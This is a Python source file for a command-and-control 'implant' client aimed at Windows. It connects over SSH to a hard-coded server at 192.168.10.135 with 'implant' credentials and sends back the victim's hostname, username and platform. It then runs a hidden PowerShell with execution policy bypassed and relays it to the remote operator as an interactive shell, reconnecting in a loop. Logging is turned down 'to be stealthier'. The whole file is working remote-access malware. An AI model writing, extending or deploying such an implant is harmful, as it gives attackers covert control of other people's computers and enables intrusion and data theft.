import paramiko
import subprocess
import os
import sys
import socket
import getpass
import time
import logging
import argparse
import platform
import threading
import select
from typing import Dict, Any

# Configure logging
logging.basicConfig(
    level=logging.ERROR,  # Set to ERROR to be stealthier, INFO for debugging
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('C2Client')


class C2Client:
    """C2 Client implementation using SSH for command and control with PTY support for Windows"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.ssh_client = None
        self.channel = None
        self.reconnect_delay = 5  # seconds between reconnection attempts
        self.system_info = self._gather_system_info()
        self.process = None
    
    def _gather_system_info(self) -> Dict[str, str]:
        """Gather basic system information"""
        info = {
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'platform': platform.system(),
            'platform_version': platform.version(),
            'architecture': platform.machine()
        }
        return info
    
    def connect(self) -> bool:
        """Establish connection to the C2 server with PTY support"""
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            logger.debug(f"Connecting to {self.config['server_ip']}:{self.config['server_port']}")
            self.ssh_client.connect(
                self.config['server_ip'], 
                port=self.config['server_port'],
                username=self.config['username'],
                password=self.config['password'],
                timeout=10
            )
            
            transport = self.ssh_client.get_transport()
            self.channel = transport.open_session()
            
            # Request a PTY for Windows
            self.channel.get_pty(term='vt100', width=80, height=24)
            self.channel.invoke_shell()
            
            if self.channel.active:
                # Send system information to server
                client_info = f"Implant checked in from {self.system_info['hostname']} as {self.system_info['username']} ({self.system_info['platform']} {self.system_info['architecture']})\r\n"
                self.channel.send(client_info)
                logger.info("Successfully connected to C2 server")
                return True
            else:
                logger.error("Failed to establish active channel")
                return False
                
        except Exception as e:
            logger.error(f"Connection error: {e}")
            return False
    
    def start_powershell(self):
        """Start PowerShell as the interactive shell"""
        try:
            # Start PowerShell with appropriate parameters for interactive use
            self.process = subprocess.Popen(
                ["powershell.exe", "-NoExit", "-NoLogo", "-ExecutionPolicy", "Bypass"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=0,
                text=False,  # Binary mode for proper handling of control chars
                creationflags=subprocess.CREATE_NO_WINDOW  # Hidden window
            )
            logger.debug("Started PowerShell process")
            return True
        except Exception as e:
            logger.error(f"Error starting PowerShell: {e}")
            return False
    
    def forward_io(self):
        """Forward I/O between the SSH channel and PowerShell process"""
        def read_from_process():
            """Read output from PowerShell and forward to SSH channel"""
            while True:
                try:
                    if not self.process or self.process.poll() is not None:
                        # Process ended
                        break
                        
                    # Read from process stdout
                    data = self.process.stdout.read(1)
                    if not data:
                        break
                        
                    # Send to SSH channel
                    self.channel.send(data)
                except Exception as e:
                    logger.error(f"Process read error: {e}")
                    break
        
        def read_from_channel():
            """Read input from SSH channel and forward to PowerShell"""
            while True:
                try:
                    if not self.channel or not self.channel.active:
                        # Channel closed
                        break
                        
                    # Check if data is available
                    if self.channel.recv_ready():
                        data = self.channel.recv(1024)
                        if not data:
                            break
                            
                        # Send to PowerShell process
                        if self.process and self.process.poll() is None:
                            self.process.stdin.write(data)
                            self.process.stdin.flush()
                    else:
                        time.sleep(0.1)  # Prevent CPU thrashing
                except Exception as e:
                    logger.error(f"Channel read error: {e}")
                    break
        
        # Start threads for bidirectional communication
        t1 = threading.Thread(target=read_from_process)
        t2 = threading.Thread(target=read_from_channel)
        t1.daemon = True
        t2.daemon = True
        t1.start()
        t2.start()
        
        # Wait for either thread to exit
        while t1.is_alive() and t2.is_alive():
            time.sleep(0.5)
            
            # Check if channel is still active
            if not self.channel or not self.channel.active:
                break
                
            # Check if process is still running
            if self.process and self.process.poll() is not None:
                break
    
    def command_loop(self):
        """Main command processing loop with PTY support"""
        while True:
            try:
                if not self.channel or not self.channel.active:
                    logger.info("Channel no longer active, attempting to reconnect")
                    self.disconnect()
                    time.sleep(self.reconnect_delay)
                    if not self.connect():
                        time.sleep(self.reconnect_delay)
                        continue
                
                # Send PowerShell banner to indicate readiness
                self.channel.send("Windows PowerShell\r\nCopyright (C) Microsoft Corporation.\r\n\r\n")
                
                # Start PowerShell
                if not self.start_powershell():
                    logger.error("Failed to start PowerShell, retrying...")
                    time.sleep(self.reconnect_delay)
                    continue
                
                # Handle I/O forwarding
                self.forward_io()
                
                # If we get here, either the channel closed or PowerShell exited
                logger.info("Session ended, reconnecting...")
                self.disconnect()
                time.sleep(self.reconnect_delay)
                
            except KeyboardInterrupt:
                logger.info("Keyboard interrupt received, exiting")
                break
            except Exception as e:
                logger.error(f"Error in command loop: {e}")
                self.disconnect()
                time.sleep(self.reconnect_delay)
    
    def disconnect(self):
        """Clean up and disconnect"""
        if self.process:
            try:
                self.process.terminate()
                self.process = None
            except:
                pass
            
        if self.channel:
            try:
                self.channel.close()
                self.channel = None
            except:
                pass
        
        if self.ssh_client:
            try:
                self.ssh_client.close()
                self.ssh_client = None
            except:
                pass
    
    def run(self):
        """Main entry point for client operation"""
        try:
            if self.connect():
                self.command_loop()
            else:
                logger.error("Initial connection failed")
        except Exception as e:
            logger.error(f"Runtime error: {e}")
        finally:
            self.disconnect()


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description="C2 Client")
    parser.add_argument("--server", default="192.168.10.135", help="C2 server address")
    parser.add_argument("--port", type=int, default=2222, help="C2 server port")
    parser.add_argument("--username", default="implant", help="Authentication username")
    parser.add_argument("--password", default="implant", help="Authentication password")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    return parser.parse_args()


def main():
    """Main entry point"""
    try:
        args = parse_arguments()
        
        # Configure logging level
        if args.debug:
            logger.setLevel(logging.DEBUG)
        
        config = {
            'server_ip': args.server,
            'server_port': args.port,
            'username': args.username,
            'password': args.password
        }
        
        client = C2Client(config)
        client.run()
        
    except Exception as e:
        logger.error(f"Error: {e}")


if __name__ == '__main__':
    main()